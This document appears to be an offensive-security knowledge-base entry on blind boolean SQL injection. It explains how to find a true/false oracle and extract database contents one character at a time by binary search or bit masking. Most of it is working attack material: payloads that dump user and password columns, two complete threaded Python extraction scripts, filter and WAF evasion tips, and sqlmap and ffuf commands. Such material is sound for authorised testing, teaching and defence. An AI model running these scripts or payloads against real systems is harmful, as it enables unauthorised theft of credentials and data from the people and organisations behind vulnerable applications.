---
title: "SQL Injection - Blind Boolean & Binary-Search Exfiltration"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, blind-sqli, boolean-based, binary-search, bisection, substring, ascii, oracle, exfiltration, mysql, postgres, sqlite, mssql, sqlmap, burp, threading]
difficulty: medium
summary: "Turn any true/false difference in the response into a 1-bit oracle, then binary-search each character out of the database in 7 requests."
when_to_use:
  - "`' AND 1=1-- -` and `' AND 1=2-- -` produce visibly different responses (length, status, a word like 'Welcome')"
  - "No UNION context and no reflected SQL error"
  - "A login form that returns 'invalid user' vs 'invalid password', or a 200 vs 302"
  - "A search box where a matching query renders results and a non-matching one renders an empty list"
tools: [sqlmap, burp, curl, ffuf]
---

## TL;DR

You cannot see query output, but you can see whether a condition was true. Wrap any expression in
`AND (<condition>)`, observe the response, and you have one bit. `SUBSTR(x,i,1) > 'm'` plus bisection
extracts one character in `ceil(log2(charset))` ~= 7 requests. Threaded, that is a few hundred requests
for a password hash -- minutes, not hours.

## Recognise it

- Two payloads, two distinguishable responses:
  - `?id=1 AND 1=1` -> product page renders. `?id=1 AND 1=2` -> "no such product".
  - `user=admin' AND '1'='1` -> "wrong password". `user=admin' AND '1'='2` -> "no such user".
  - HTTP 200 vs 500, Content-Length 4821 vs 4193, a `<div class="row">` present vs absent.
- `AND` is filtered but `&&` (`%26%26`), `AND/**/`, or `||` in Oracle/Postgres still flips the response.
- The difference may be subtle: a missing image, a different `Set-Cookie`, a redirect target.
  Diff two raw responses byte-for-byte before you conclude there is no oracle.

## Theory

An oracle is any function `oracle(sql_condition) -> bool` that is faithful and cheap.
Given one, extraction is a search problem.

### Naive: equality scan

`AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'` -- try every char. 95 requests/char worst case.
Only use this when comparison operators are filtered.

### Binary search over ASCII (the default)

```
lo, hi = 32, 126
while lo < hi:
    mid = (lo + hi) // 2
    if ASCII(SUBSTR(val, i, 1)) > mid:  lo = mid + 1
    else:                               hi = mid
value[i] = chr(lo)
```

95 candidates -> `ceil(log2(95)) = 7` requests per character. Deterministic, no charset assumption
beyond printable ASCII.

### Bit extraction (7 requests/char, no `>` needed)

When `>` / `<` are filtered but `&` and `=` survive:

```sql
AND (ASCII(SUBSTR((SELECT p FROM u LIMIT 1),{i},1)) & {1<<b}) = {1<<b}
```

Seven bits, seven requests, and they are **independent** -- you can fire all 7 in parallel per character,
which is much better wall-clock than a serial bisection.

### Charset reduction

If you know the value is a hex digest, the alphabet is 16 chars -> 4 requests/char.
If it is base64, 64 chars -> 6. Always probe the alphabet first:
`AND (SELECT p FROM u LIMIT 1) REGEXP '^[0-9a-f]+$'` (MySQL) / `~ '^[0-9a-f]+$'` (Postgres).

### Length first

`AND LENGTH((SELECT p FROM u LIMIT 1))=32` -- bisect the length too (or just test 1..64).
Knowing the length lets you parallelise all positions at once instead of stopping at an empty char.

### Substring function per engine

| Engine     | substring                      | char code   | length     | concat |
|------------|--------------------------------|-------------|------------|--------|
| MySQL      | `SUBSTRING(x,i,1)` / `MID`     | `ASCII()` / `ORD()` | `LENGTH()` | `CONCAT()` |
| PostgreSQL | `substr(x,i,1)`                | `ascii()`   | `length()` | `||`   |
| MSSQL      | `SUBSTRING(x,i,1)`             | `ASCII()` / `UNICODE()` | `LEN()` | `+` |
| Oracle     | `SUBSTR(x,i,1)`                | `ASCII()`   | `LENGTH()` | `||`   |
| SQLite     | `substr(x,i,1)`                | `unicode()` | `length()` | `||`   |

Note MSSQL's `LEN()` trims trailing spaces -- use `DATALENGTH()` when that matters.

## Attack

1. Find the oracle. Send a known-true and a known-false payload, diff the responses, pick a
   stable discriminator (a substring, a status code, or a length threshold -- in that order of preference).
2. Verify the oracle both ways at least twice. A flaky oracle silently corrupts everything downstream.
3. Probe the DBMS: `AND (SELECT 1 FROM sqlite_master LIMIT 1)=1` (SQLite), `AND @@version LIKE '%'` (MySQL/MSSQL),
   `AND (SELECT 1 FROM pg_tables LIMIT 1)=1` (Postgres).
4. Get the length of the target expression.
5. Binary-search or bit-extract each position, threaded.
6. Re-run once with a different technique to catch oracle noise.

Useful one-shot expressions to target (they return everything in one string, so you only pay per character):

```sql
-- MySQL
(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())
(SELECT group_concat(concat_ws(0x3a,user,password)) FROM users)
-- Postgres
(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')
-- SQLite
(SELECT group_concat(sql) FROM sqlite_master)
-- MSSQL
(SELECT STRING_AGG(name,',') FROM sys.tables)
```

## Code

```python
#!/usr/bin/env python3
"""Threaded boolean-blind SQLi exfiltration by binary search.

Usage:
    python3 blind_bool.py "http://127.0.0.1:8000/item.php?id=1" "SELECT group_concat(name) FROM sqlite_master"

Edit TRUE_MARK / oracle() for your target. The default oracle treats the presence of
TRUE_MARK in the body as 'condition was true'.
"""
from __future__ import annotations

import concurrent.futures
import sys
import urllib.parse

import requests

TRUE_MARK = "Widget"        # a string present ONLY when the injected condition is true
TIMEOUT = 10
THREADS = 16
SUBSTR = "substr"           # sqlite/postgres; use SUBSTRING for mysql/mssql
ASCII_FN = "unicode"        # sqlite; ascii for postgres/mysql/oracle, ASCII for mssql
LENGTH_FN = "length"        # LEN for mssql

SESSION = requests.Session()
SESSION.headers["User-Agent"] = "Mozilla/5.0"


def build(url: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        raise SystemExit("[-] target needs a query parameter")
    k, v = qs[-1]
    qs[-1] = (k, v + payload)
    q = "&".join(f"{a}={urllib.parse.quote(b, safe='')}" for a, b in qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, q, parts.fragment))


def oracle(url: str, condition: str) -> bool:
    """Return True iff the SQL `condition` evaluated true. Retries once on network error."""
    payload = f"' AND ({condition})-- -"
    for _ in range(2):
        try:
            r = SESSION.get(build(url, payload), timeout=TIMEOUT)
            return TRUE_MARK in r.text
        except requests.RequestException:
            continue
    return False


def sanity(url: str) -> bool:
    t = oracle(url, "1=1")
    f = oracle(url, "1=2")
    print(f"[*] oracle check: true->{t} false->{f}")
    return t and not f


def get_length(url: str, expr: str, cap: int = 4096) -> int:
    """Exponential probe then bisect."""
    hi = 1
    while hi < cap and oracle(url, f"{LENGTH_FN}(({expr}))>{hi}"):
        hi *= 2
    lo = hi // 2
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(url, f"{LENGTH_FN}(({expr}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def char_at(url: str, expr: str, idx: int) -> str:
    """Binary search one character over printable ASCII."""
    lo, hi = 31, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        cond = f"{ASCII_FN}({SUBSTR}(({expr}),{idx},1))>={mid}"
        if oracle(url, cond):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo) if lo >= 32 else ""


def extract(url: str, expr: str) -> str:
    n = get_length(url, expr)
    print(f"[+] length = {n}")
    if n <= 0:
        return ""
    out = [""] * n
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:
        futs = {pool.submit(char_at, url, expr, i + 1): i for i in range(n)}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            i = futs[fut]
            out[i] = fut.result()
            done += 1
            sys.stderr.write(f"\r[*] {done}/{n}")
        sys.stderr.write("\n")
    return "".join(out)


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/item.php?id=1"
    expr = sys.argv[2] if len(sys.argv) > 2 else "SELECT group_concat(name) FROM sqlite_master"
    if not sanity(url):
        print("[-] oracle is not faithful; fix TRUE_MARK or the injection prefix first")
        return
    print(f"[*] extracting: {expr}")
    print("[+] " + extract(url, expr))


if __name__ == "__main__":
    main()
```

### Bit-parallel variant (7 independent requests per char)

```python
#!/usr/bin/env python3
"""Bit-by-bit blind SQLi: no comparison operators, 7 fully parallel requests per character."""
from __future__ import annotations

import concurrent.futures
import sys

import requests

TARGET = "http://127.0.0.1:8000/item.php?id=1"
TRUE_MARK = "Widget"
SESSION = requests.Session()


def oracle(url: str, cond: str) -> bool:
    try:
        return TRUE_MARK in SESSION.get(url + f"' AND ({cond})-- -", timeout=10).text
    except requests.RequestException:
        return False


def bit(url: str, expr: str, idx: int, b: int) -> int:
    mask = 1 << b
    cond = f"(unicode(substr(({expr}),{idx},1)) & {mask})={mask}"
    return mask if oracle(url, cond) else 0


def char_at(url: str, expr: str, idx: int, pool: concurrent.futures.ThreadPoolExecutor) -> str:
    futs = [pool.submit(bit, url, expr, idx, b) for b in range(7)]
    code = sum(f.result() for f in futs)
    return chr(code) if 32 <= code <= 126 else ""


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET
    expr = sys.argv[2] if len(sys.argv) > 2 else "SELECT group_concat(name) FROM sqlite_master"
    n = int(sys.argv[3]) if len(sys.argv) > 3 else 64
    out = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=28) as pool:
        for i in range(1, n + 1):
            c = char_at(url, expr, i, pool)
            if not c:
                break
            out.append(c)
            sys.stderr.write(c)
    sys.stderr.write("\n")
    print("[+] " + "".join(out))


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Noisy oracle.** Rotating ads, CSRF tokens and timestamps change response length every request.
  Never use raw `len(body)` as the discriminator without normalising; prefer a stable substring.
- **Rate limiting / WAF banning.** Add jitter, lower `THREADS`, reuse the session (keep-alive), and
  consider the bit-parallel variant so you need fewer round trips overall.
- **Case-insensitive collation.** MySQL's default `utf8_general_ci` makes `'a'='A'` true, so a naive
  equality scan returns the wrong case. Fix with `BINARY`: `AND BINARY SUBSTRING(x,i,1)='a'`, or
  compare `ASCII()` values (bisection already does).
- **Trailing spaces.** MSSQL `=` pads; `LEN()` trims. Use `DATALENGTH` and `+'|'` sentinels.
- **The injection is in a LIMIT/ORDER BY.** `AND` does not apply. Use
  `ORDER BY (CASE WHEN (<cond>) THEN name ELSE id END)` and read the ordering, or
  `LIMIT 1 OFFSET (CASE WHEN ... THEN 0 ELSE 1 END)`.
- **Second-order oracle.** The condition is stored and evaluated on a different page; see `sqli-second-order`.
- **`AND` is filtered.** Try `&&`, `%26%26`, `AND/**/`, `%0aAND`, or move to a `UNION SELECT ... WHERE <cond>`
  shape where the row count itself is the oracle.
- **Always re-verify the last few characters.** Off-by-one in `SUBSTR` indexing (1-based everywhere
  except a few drivers) is the most common silent bug.

## Tools

- `sqlmap -u URL --technique=B --string='Widget' --threads=10 --dump` -- `--string` pins the true-marker.
- `sqlmap --not-string='no such product'` when the false case is the distinctive one.
- Burp Comparer to diff true/false responses byte-for-byte.
- `ffuf -u 'URL?id=1%27%20AND%20SUBSTR(...)%3D%27FUZZ' -w charset.txt -fs <size>` for a quick manual sweep.

## References

- PortSwigger Web Security Academy -- Blind SQL injection: https://portswigger.net/web-security/sql-injection/blind
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- sqlmap: https://github.com/sqlmapproject/sqlmap
